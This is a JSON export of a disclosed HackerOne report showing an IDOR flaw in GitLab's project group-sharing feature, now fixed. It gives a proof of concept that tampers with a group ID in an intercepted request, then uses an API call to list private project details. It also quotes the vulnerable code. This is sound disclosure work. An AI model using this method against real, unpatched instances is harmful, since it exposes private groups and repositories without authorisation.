{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-06-27T19:48:20.278Z", 
    "voters": [
        "shailesh4594", 
        "yaworsk", 
        "mdv", 
        "eveeez", 
        "smit", 
        "secdoor", 
        "spetr0x", 
        "3p1c", 
        "dyabla", 
        "cryptosector", 
        "and 5 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 131210, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Privilege escalation to access all private groups and repositories", 
    "is_member_of_team?": null, 
    "vote_count": 15, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2278, 
            "content": "Additional information on our internal communication can be viewed at https://gitlab.com/gitlab-org/gitlab-ce/issues/15330.", 
            "content_html": "<p>Additional information on our internal communication can be viewed at <a title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/15330\" href=\"/redirect?signature=ccdec569c8d835e27d0e6ca28de4b8dd6c307e7e&amp;url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F15330\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gitlab.com/gitlab-org/gitlab-ce/issues/15330</span><i class=\"icon-external-link\"></i></a>.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-07-27T19:48:20.438Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-18T07:57:25.791Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-18T07:57:25.791Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jobert,\n\nThank you for reporting. The issue has been published for our team to evaluate. I'll report back shortly. Feel free to get in touch through security@gitlab.com for any follow up required.\n\nBest regards,\n\nJos\u00e9 Torres\nGitLab B.V.", 
            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Thank you for reporting. The issue has been published for our team to evaluate. I&#39;ll report back shortly. Feel free to get in touch through <a title=\"security@gitlab.com\" href=\"mailto:security@gitlab.com\" rel=\"nofollow noopener noreferrer\">security@gitlab.com</a> for any follow up required.</p>\n\n<p>Best regards,</p>\n\n<p>Jos\u00e9 Torres<br>\nGitLab B.V.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 911211, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-19T19:51:19.609Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-19T19:51:19.609Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jobert,\n\nJust wanted to let you know that the fix has been scheduled for GitLab 8.7 to be released April 22nd. I'll report back with merge request for you to confirm.\n\nBest regards,\n\nJos\u00e9 Torres\nGitLab B.V.", 
            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Just wanted to let you know that the fix has been scheduled for GitLab 8.7 to be released April 22nd. I&#39;ll report back with merge request for you to confirm.</p>\n\n<p>Best regards,</p>\n\n<p>Jos\u00e9 Torres<br>\nGitLab B.V.</p>\n", 
            "type": "Activities::Comment", 
            "id": 915736, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-20T03:14:18.710Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-20T03:16:03.163Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jos\u00e9,\n\nThat sounds great, thanks. One thing I noticed today is that this issue also seems to exist in the API. When a `POST` request is sent to `/projects/:id/share`, the project can be shared with a group. Here's an excerpt of the code that is executed (`lib/api/projects.rb:310-313`):\n\n```ruby\nlink = user_project.project_group_links.new\nlink.group_id = params[:group_id]\nlink.group_access = params[:group_access]\nif link.save\n```\n\nThe first three lines are almost exactly the same code as used in the `Projects::GroupLinksController`. When `save` is called, the admin of the project gets read access to that group identified by `params[:group_id]`, resulting in the same issue as described in the initial report. Let me know if you have any questions!", 
            "markdown_message": "<p>Hi Jos\u00e9,</p>\n\n<p>That sounds great, thanks. One thing I noticed today is that this issue also seems to exist in the API. When a <code>POST</code> request is sent to <code>/projects/:id/share</code>, the project can be shared with a group. Here&#39;s an excerpt of the code that is executed (<code>lib/api/projects.rb:310-313</code>):</p>\n<pre class=\"highlight ruby\"><code><span class=\"n\">link</span> <span class=\"o\">=</span> <span class=\"n\">user_project</span><span class=\"p\">.</span><span class=\"nf\">project_group_links</span><span class=\"p\">.</span><span class=\"nf\">new</span>\n<span class=\"n\">link</span><span class=\"p\">.</span><span class=\"nf\">group_id</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:group_id</span><span class=\"p\">]</span>\n<span class=\"n\">link</span><span class=\"p\">.</span><span class=\"nf\">group_access</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:group_access</span><span class=\"p\">]</span>\n<span class=\"k\">if</span> <span class=\"n\">link</span><span class=\"p\">.</span><span class=\"nf\">save</span>\n</code></pre>\n<p>The first three lines are almost exactly the same code as used in the <code>Projects::GroupLinksController</code>. When <code>save</code> is called, the admin of the project gets read access to that group identified by <code>params[:group_id]</code>, resulting in the same issue as described in the initial report. Let me know if you have any questions!</p>\n", 
            "type": "Activities::Comment", 
            "id": 916454, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jobert", 
                "url": "/jobert"
            }, 
            "created_at": "2016-06-26T22:06:54.101Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-26T22:06:54.101Z", 
            "actor": {
                "username": "jose", 
                "url": "/jose", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/050/961/c8ecc0d20abbfa47eea6ee7c830816a43cf5e84a_medium.jpg?1452792141"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "Hi Jobert,\n\nThe fix has been published. Thank you very much for reporting. Feel free to let me know if there are any additional suggestions. \n\nBest regards,\n\nJos\u00e9 Torres\nLead Service Engineer\nGitLab, Inc.", 
            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>The fix has been published. Thank you very much for reporting. Feel free to let me know if there are any additional suggestions. </p>\n\n<p>Best regards,</p>\n\n<p>Jos\u00e9 Torres<br>\nLead Service Engineer<br>\nGitLab, Inc.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1038954, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-27T19:48:20.337Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-27T19:48:20.337Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1041527, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-27T19:48:28.034Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-27T19:48:28.034Z", 
            "actor": {
                "url": "/gitlab", 
                "profile": {
                    "name": "GitLab"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
                }
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1091615, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jobert", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jobert", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/002/15c798072d48f06507cde4b11352a3338ae973fc_small.png?1410255083"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 75, 
        "name": "Privilege Escalation"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -74487763.65620558, 
    "disclosed_at": "2016-07-27T19:48:27.940Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/131210", 
    "created_at": "2016-04-15T21:35:59.960Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"vulnerability-details\">Vulnerability details</h1>\n\n<p>There is an insecure direct object reference (IDOR) issue in the group sharing feature for a project. This allows an attacker to get access to the names of private repositories of a group, issues, milestones, and the group its team members.</p>\n\n<h1 id=\"proof-of-concept\">Proof of concept</h1>\n\n<p>First, lets set up the private group. Go to <a title=\"http://gitlab-instance/groups/new\" href=\"/redirect?signature=9bb01e79256ee53e7f1534361facec5c2b5a65ef&amp;url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fnew\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/groups/new</span><i class=\"icon-external-link\"></i></a> and fill in a name and set its visibility to private. In this example, lets call the group <code>private-group</code>. Lets also create a new project in the group at <a title=\"http://gitlab-instance/projects/new?namespace_id=7\" href=\"/redirect?signature=8aa2078927b6b6494b402b762bcfa30dc9318d64&amp;url=http%3A%2F%2Fgitlab-instance%2Fprojects%2Fnew%3Fnamespace_id%3D7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/projects/new?namespace_id=7</span><i class=\"icon-external-link\"></i></a>. The ID in the URL changes depending on the ID of the group that was just created. Lets call the project <code>secret-project</code>. Memorize this ID, you need it later in the PoC.</p>\n\n<p>Now to get access to the group without being a member, sign in as some user (<code>jane</code>), create a new project and call it <code>dummy-project</code>. If Jane now goes to <a title=\"http://gitlab-instance/groups/private-group\" href=\"/redirect?signature=2153e0980ed525fa7eeada2159f7681bfaea1c27&amp;url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fprivate-group\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/groups/private-group</span><i class=\"icon-external-link\"></i></a>, a 404 is shown. This is good. Now go to <a title=\"http://gitlab-instance/jane/dummy-project/group_links\" href=\"/redirect?signature=ff3b003542d9110691a2725a0d365074a4ea5903&amp;url=http%3A%2F%2Fgitlab-instance%2Fjane%2Fdummy-project%2Fgroup_links\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/jane/dummy-project/group_links</span><i class=\"icon-external-link\"></i></a>. Now select a random public group from the dropdown list. Before clicking on the &quot;Share&quot; button , make sure you intercept your network traffic. The request that is being sent to the server will look something like this:</p>\n<pre class=\"highlight plaintext\"><code>POST /jane/dummy-group/group_links HTTP/1.1\nHost: 159.xxx.xxx.xxx\n...\n\nutf8=%E2%9C%93&amp;authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D&amp;link_group_id=6&amp;link_group_access=40\n</code></pre>\n<p>Now change the <code>link_group_id</code> in this request to the ID that you memorized in the first paragraph of this section and forward the request. Your page will now show the name of the private group. If Jane now goes to <a title=\"http://gitlab-instance/groups/private-group\" href=\"/redirect?signature=2153e0980ed525fa7eeada2159f7681bfaea1c27&amp;url=http%3A%2F%2Fgitlab-instance%2Fgroups%2Fprivate-group\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/groups/private-group</span><i class=\"icon-external-link\"></i></a>, to secret group page is shown. At this point, the private repositories are still hidden.</p>\n\n<p>Since the attacker has read access to the group now, there are some endpoints that leak some private information. By sending a request to the <a title=\"http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL&amp;search=&amp;per_page=20\" href=\"/redirect?signature=c7892c6975251a20aa6e051a0682329427e07b4c&amp;url=http%3A%2F%2Fgitlab-instance%2Fapi%2Fv3%2Fgroups%2F7%2Fprojects.json%3Fprivate_token%3DZJirZUgh9QGSQfaGBHDL%26search%3D%26per_page%3D20\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL&amp;search=&amp;per_page=20</span><i class=\"icon-external-link\"></i></a> endpoint with Jane&#39;s API token, the private repositories are leaked. Here&#39;s an example response:</p>\n<pre class=\"highlight json\"><code><span class=\"p\">[</span><span class=\"w\">\n  </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"mi\">11</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;description&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Super secret description of this project.&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;default_branch&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;tag_list&quot;</span><span class=\"p\">:[],</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;public&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;archived&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;visibility_level&quot;</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;ssh_url_to_repo&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;git@gitlab-instance:super-private/secret-project.git&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;http_url_to_repo&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;http://gitlab-instance/super-private/secret-project.git&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;web_url&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;http://gitlab-instance/super-private/secret-project&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;secret-project&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name_with_namespace&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;super-private / secret-project&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;path&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;secret-project&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;path_with_namespace&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;super-private/secret-project&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;issues_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;merge_requests_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;wiki_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;builds_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;snippets_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;created_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-04-15T20:55:19.228Z&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;last_activity_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-04-15T20:56:24.988Z&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;shared_runners_enabled&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;creator_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;namespace&quot;</span><span class=\"p\">:{</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"mi\">7</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;super-private&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;path&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;super-private&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;owner_id&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;created_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-04-15T20:42:01.718Z&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;updated_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-04-15T20:42:01.718Z&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;description&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Super private group.&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;avatar&quot;</span><span class=\"p\">:</span><span class=\"w\">\n      </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"s2\">&quot;url&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"w\">\n      </span><span class=\"p\">},</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;share_with_group_lock&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;visibility_level&quot;</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;avatar_url&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;star_count&quot;</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;forks_count&quot;</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;open_issues_count&quot;</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;public_builds&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"w\">\n  </span><span class=\"p\">}</span><span class=\"w\">\n</span><span class=\"p\">]</span><span class=\"w\">\n</span></code></pre>\n<p>The repository itself can&#39;t be accessed, but there&#39;s definitely some information disclosed that the attacker shouldn&#39;t have access to. In a real world scenario, someone could iterate over all namespace IDs and get access to all private groups. From there, it could send a request to the GitLab API to gain more knowledge about the private projects.</p>\n\n<h1 id=\"fix\">Fix</h1>\n\n<p>This can be fixed by restricting which groups can be added to a project by a user. The issue itself originates from line 11 of the <code>Projects::GroupLinksController</code>, which can be found at <code>app/controllers/projects/group_links_controller.rb</code>.</p>\n", 
    "vulnerability_information": "# Vulnerability details\nThere is an insecure direct object reference (IDOR) issue in the group sharing feature for a project. This allows an attacker to get access to the names of private repositories of a group, issues, milestones, and the group its team members.\n\n# Proof of concept\nFirst, lets set up the private group. Go to http://gitlab-instance/groups/new and fill in a name and set its visibility to private. In this example, lets call the group `private-group`. Lets also create a new project in the group at http://gitlab-instance/projects/new?namespace_id=7. The ID in the URL changes depending on the ID of the group that was just created. Lets call the project `secret-project`. Memorize this ID, you need it later in the PoC.\n\nNow to get access to the group without being a member, sign in as some user (`jane`), create a new project and call it `dummy-project`. If Jane now goes to http://gitlab-instance/groups/private-group, a 404 is shown. This is good. Now go to http://gitlab-instance/jane/dummy-project/group_links. Now select a random public group from the dropdown list. Before clicking on the \"Share\" button , make sure you intercept your network traffic. The request that is being sent to the server will look something like this:\n\n```\nPOST /jane/dummy-group/group_links HTTP/1.1\nHost: 159.xxx.xxx.xxx\n...\n\nutf8=%E2%9C%93&authenticity_token=LKWaV6ekT0zFbfFJPKRG78OyIsUvCxObht2Dn1l7p02SEa9IrefoAtdtwX%2F890lUqS2HLCtASPQyvFWmCYtJwA%3D%3D&link_group_id=6&link_group_access=40\n```\n\nNow change the `link_group_id` in this request to the ID that you memorized in the first paragraph of this section and forward the request. Your page will now show the name of the private group. If Jane now goes to http://gitlab-instance/groups/private-group, to secret group page is shown. At this point, the private repositories are still hidden.\n\nSince the attacker has read access to the group now, there are some endpoints that leak some private information. By sending a request to the http://gitlab-instance/api/v3/groups/7/projects.json?private_token=ZJirZUgh9QGSQfaGBHDL&search=&per_page=20 endpoint with Jane's API token, the private repositories are leaked. Here's an example response:\n\n```json\n[\n  {\n    \"id\":11,\n    \"description\":\"Super secret description of this project.\",\n    \"default_branch\":null,\n    \"tag_list\":[],\n    \"public\":false,\n    \"archived\":false,\n    \"visibility_level\":0,\n    \"ssh_url_to_repo\":\"git@gitlab-instance:super-private/secret-project.git\",\n    \"http_url_to_repo\":\"http://gitlab-instance/super-private/secret-project.git\",\n    \"web_url\":\"http://gitlab-instance/super-private/secret-project\",\n    \"name\":\"secret-project\",\n    \"name_with_namespace\":\"super-private / secret-project\",\n    \"path\":\"secret-project\",\n    \"path_with_namespace\":\"super-private/secret-project\",\n    \"issues_enabled\":true,\n    \"merge_requests_enabled\":true,\n    \"wiki_enabled\":true,\n    \"builds_enabled\":true,\n    \"snippets_enabled\":false,\n    \"created_at\":\"2016-04-15T20:55:19.228Z\",\n    \"last_activity_at\":\"2016-04-15T20:56:24.988Z\",\n    \"shared_runners_enabled\":true,\n    \"creator_id\":1,\n    \"namespace\":{\n      \"id\":7,\n      \"name\":\"super-private\",\n      \"path\":\"super-private\",\n      \"owner_id\":null,\n      \"created_at\":\"2016-04-15T20:42:01.718Z\",\n      \"updated_at\":\"2016-04-15T20:42:01.718Z\",\n      \"description\":\"Super private group.\",\n      \"avatar\":\n      {\n        \"url\":null\n      },\n      \"share_with_group_lock\":false,\n      \"visibility_level\":0\n    },\n    \"avatar_url\":null,\n    \"star_count\":0,\n    \"forks_count\":0,\n    \"open_issues_count\":1,\n    \"public_builds\":true\n  }\n]\n```\n\nThe repository itself can't be accessed, but there's definitely some information disclosed that the attacker shouldn't have access to. In a real world scenario, someone could iterate over all namespace IDs and get access to all private groups. From there, it could send a request to the GitLab API to gain more knowledge about the private projects.\n\n# Fix\nThis can be fixed by restricting which groups can be added to a project by a user. The issue itself originates from line 11 of the `Projects::GroupLinksController`, which can be found at `app/controllers/projects/group_links_controller.rb`.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://about.gitlab.com", 
            "about": "Open source software to collaborate on code", 
            "twitter_handle": "gitlab", 
            "name": "GitLab"
        }, 
        "handle": "gitlab", 
        "url": "https://hackerone.com/gitlab", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 264, 
        "default_currency": "usd"
    }, 
    "is_published": false
}